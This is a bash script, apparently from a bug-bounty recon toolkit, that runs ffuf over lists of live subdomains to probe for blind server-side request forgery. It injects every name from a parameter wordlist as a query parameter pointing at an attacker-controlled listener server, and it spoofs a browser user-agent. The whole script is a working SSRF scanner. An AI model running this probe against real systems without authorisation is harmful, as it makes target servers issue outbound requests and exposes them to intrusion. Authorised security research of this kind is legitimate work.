#!/bin/bash

CUSTOMHEADER='X-HackerOne-Research:storenth'
REQUESTSPERSECOND=2
NUMBEROFTHREADS=20
PARAMSLIST=./wordlist/params-list.txt


echo "[$(date | awk '{ print $4}')] [SSRF] Blind probe..."
xargs -I {} ffuf -s -timeout 1 -ignore-body -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
                -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
                -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
                -t 1 \
                -p 0.5 \
                -H "$CUSTOMHEADER" \
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0" \
                -mode pitchfork \
    < $PARAMSLIST > /dev/null

echo "[$(date | awk '{ print $4}')] [SSRF-2] done."
echo